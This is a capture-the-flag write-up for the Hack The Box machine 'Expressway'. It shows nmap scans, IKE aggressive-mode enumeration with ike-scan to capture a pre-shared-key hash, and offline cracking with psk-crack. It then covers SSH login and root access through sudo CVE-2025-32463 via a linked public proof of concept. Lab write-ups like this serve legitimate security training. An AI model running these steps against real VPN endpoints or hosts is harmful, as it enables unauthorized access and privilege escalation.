---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Expressway Machine Walk-through

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

***

_Welcome! This write-up walks through the_ **Expressway** _machine on Hack The Box Season9. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

#### About Machine

#### Machine Info

* **Machine Name:** Expressway
* **Machine OS:** Linux
* **Difficulty:** Easy
* **Machine Link:** \[[https://app.hackthebox.com/machines/Expressway](https://app.hackthebox.com/machines/Expressway)]

#### Initial Enumeration

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.87 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/23%OT=22%CT=3%CU=31178%PV=Y%DS=2%DC=T%G=Y%TM=68D270A
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT11NW9%O4=M552ST11NW9%O5=M552ST1
OS:1NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 5.903 days (since Wed Sep 17 17:54:21 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   68.75 ms 10.10.14.1
2   67.75 ms 10.10.11.87
```

In output is nothing interesting. Now try to UDP scan and we can see this:

```bash
nmap -p- -A -sC -sU -vv --min-rate 10000 10.10.11.87 -oN scan.txt
```

<figure><img src="https://cdn-images-1.medium.com/max/800/0*T8QIKkSnk41VDqp_.png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sU -p 500 -vv 10.10.11.87

PORT    STATE SERVICE REASON
500/udp open  isakmp  udp-response ttl 63
```

> _ISAKMP stands for **Internet Security Association and Key Management Protocol**._

> _It is a **protocol used to establish, negotiate, modify, and delete security associations (SAs)** between two devices in a secure communication channel. ISAKMP itself does not perform encryption, but it defines the **framework** for how keys and security parameters are exchanged._

> _👉 It usually runs over **UDP port 500**._

Enumerate the ISAKMP service using `ike-scan`

```bash
sudo ike-scan -A 10.10.11.87 

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=caf6b4342fab7d74) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.94 hosts/sec).  1 returned handshake; 0 returned notify
```

we get some very important information. We get Auth (PSK) and username `ike@expressway.htb`

Now we try to get PKS (pre-shared keys) from the server:

```bash
sudo ike-scan -A -P 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=5375c3c4d2a052a0) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
b30263a005db8f7869d36f473bd7abbd1743c58ffd05a5179e6897056c47a9471cd4759fb99f504977ed2e1862da966e913b9a2ac6bdd1d48eff2f4d53c1dd1eccaf39901b0d85bde9f32e14eda10b291384695c559f0a94af8108eaca10d3dbaf67f4b183602f82afd072b62eb56d3045bcfb1d9de6a2d49ae0ce9138745489:dcc0fd89e62b15a1d5efe55ddf605d96e73a9c7a5d2216a455d77d335212ca5d9a66dc7041aa442dccf7ff59099188790932923938414f09a638b705d9ce1ae0b847f0b11533859fd6895aaa423a283c5298c03531519c37685d70f21c2889bc1346915458c64d6b7219a9690cb46c2c5a98afefe77d4d4ac56d38fd6b34d496:5375c3c4d2a052a0:29d8226b3e18d23b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:771a9441d4ee03685f23c246670d8e56f337e0de:2735f058a54cb2ce8ecb807aa49f9b5376f38a4b9c034edf1d53b333e9c143eb:2098cdb2031a40283aabe7bb648c54fdb0487877
Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.85 hosts/sec).  1 returned handshake; 0 returned notify
```

Now we try to crack this PSK hash using `psk-crack.`

First we save the hash in a text file called hash.txt. Then run the command to crack the hash:

```bash
sudo psk-crack hash.txt -d /usr/share/wordlists/rockyou.txt
```

<figure><img src="https://cdn-images-1.medium.com/max/800/0*JUfYID48qvukvksq.png" alt=""><figcaption></figcaption></figure>

We successfully crack the hash and now we try to login use ssh using the previously found username and cracked password.

<figure><img src="https://cdn-images-1.medium.com/max/800/0*GLfThbfI0qRfsL4V.png" alt=""><figcaption></figcaption></figure>

We successfully get ssh connection and also get user flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/0*0OMJmlIRkrMO_Fgh.png" alt=""><figcaption></figcaption></figure>

After many research for PrevEsc we found this:

<figure><img src="https://cdn-images-1.medium.com/max/800/0*qioryBdbUkLa9hdw.png" alt=""><figcaption></figcaption></figure>

And we search in google for any related vulnerability of this SUDO version and we found this: [CVE-2025–32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463)

And also we found this PoC: [https://github.com/KaiHT-Ladiant/CVE-2025-32463](https://github.com/KaiHT-Ladiant/CVE-2025-32463)

Now try to exploit by using this PoC And we get Root Shell:

<figure><img src="https://cdn-images-1.medium.com/max/800/0*89_XUue70kWL6K1c.png" alt=""><figcaption></figcaption></figure>

And successfully get root flag:

<figure><img src="https://cdn-images-1.medium.com/max/800/0*02hlzoe2Tk-lV7-4.png" alt=""><figcaption></figcaption></figure>

***



> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
